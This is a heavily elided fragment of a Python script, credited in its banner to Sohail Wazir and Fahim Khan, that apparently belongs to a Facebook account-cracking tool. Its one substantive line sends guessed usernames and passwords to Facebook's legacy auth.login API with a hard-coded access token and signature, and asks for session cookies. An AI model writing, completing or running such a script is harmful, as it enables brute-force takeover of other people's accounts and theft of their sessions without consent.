...
# Original written By Sohail Wazir
...
\x1b[1;91m\033[1;96mFacebook :         Sohail Wazir & Fahim Khan
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25258C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
